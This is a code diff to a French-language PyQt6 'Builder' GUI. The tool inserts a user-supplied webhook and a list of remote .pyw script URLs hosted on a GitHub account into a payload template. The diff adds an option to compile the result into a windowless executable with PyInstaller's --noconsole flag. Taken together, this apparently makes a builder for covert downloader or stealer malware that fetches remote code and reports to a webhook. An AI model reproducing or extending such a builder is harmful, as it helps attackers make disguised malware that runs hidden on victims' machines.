@@ -1,6 +1,6 @@
 from PyQt6.QtWidgets import *
 from PyQt6.QtCore import Qt
-import sys
+import sys, tempfile, subprocess, os
 
 base_code = '''
 import os, tempfile, requests, subprocess, random, string
@@ -59,17 +59,65 @@ class Builder(QWidget):
 
         btn = QPushButton("Générer le fichier")
         btn.setStyleSheet("padding:10px;background:#007acc;border:none;border-radius:5px;color:white;")
-        btn.clicked.connect(self.generate)
+        btn.clicked.connect(self.show_build_options)
         layout.addWidget(btn, alignment=Qt.AlignmentFlag.AlignCenter)
 
-    def generate(self):
+    def generate_code(self):
         webhook = self.webhook.text()
         base_url = "https://raw.githubusercontent.com/theolomo/config/refs/heads/main/"
         urls = ''.join([f'    "{base_url}{name}.pyw": {cb.isChecked()},\n' for name, cb in self.checkboxes.items()])
-        code = base_code.replace("{WEBHOOK}", webhook).replace("{URLS}", urls.strip())
+        return base_code.replace("{WEBHOOK}", webhook).replace("{URLS}", urls.strip())
+
+    def show_build_options(self):
+        dialog = QDialog(self)
+        dialog.setWindowTitle("Choisir une option")
+        dialog.setFixedSize(300, 120)
+        layout = QVBoxLayout(dialog)
+
+        label = QLabel("Que veux-tu faire ?")
+        label.setStyleSheet("font-weight:bold; padding: 10px;")
+        layout.addWidget(label, alignment=Qt.AlignmentFlag.AlignCenter)
+
+        btn_py = QPushButton("Générer en .py")
+        btn_exe = QPushButton("Compiler en .exe")
+        for btn in [btn_py, btn_exe]:
+            btn.setStyleSheet("padding:6px;border-radius:4px;background:#3c3c3c;color:white;")
+            layout.addWidget(btn)
+
+        btn_py.clicked.connect(lambda: [dialog.accept(), self.build_py()])
+        btn_exe.clicked.connect(lambda: [dialog.accept(), self.build_exe()])
+        dialog.exec()
+
+    def build_py(self):
+        code = self.generate_code()
         path, _ = QFileDialog.getSaveFileName(self, "Enregistrer", "", "Python File (*.py)")
         if path:
             with open(path, "w", encoding="utf-8") as f: f.write(code)
+
+    def build_exe(self):
+        code = self.generate_code()
+        tmp_py = os.path.join(tempfile.gettempdir(), "temp_build.py")
+        with open(tmp_py, "w", encoding="utf-8") as f:
+            f.write(code)
+
+        exe_path = QFileDialog.getSaveFileName(self, "Enregistrer l'exe", "", "Executable (*.exe)")[0]
+        if not exe_path:
+            return
+
+        cmd = f'pyinstaller --noconfirm --onefile --noconsole "{tmp_py}"'
+        subprocess.call(cmd, shell=True)
+
+        built_exe = os.path.join("dist", "temp_build.exe")
+        if os.path.exists(built_exe):
+            os.rename(built_exe, exe_path)
+
+        for folder in ["build", "dist"]:
+            if os.path.exists(folder):
+                subprocess.call(f'rmdir /s /q {folder}', shell=True)
+        if os.path.exists("temp_build.spec"):
+            os.remove("temp_build.spec")
+
+        QMessageBox.information(self, "Fini", "Compilation EXE terminée !")
 
 app = QApplication(sys.argv)
 win = Builder()
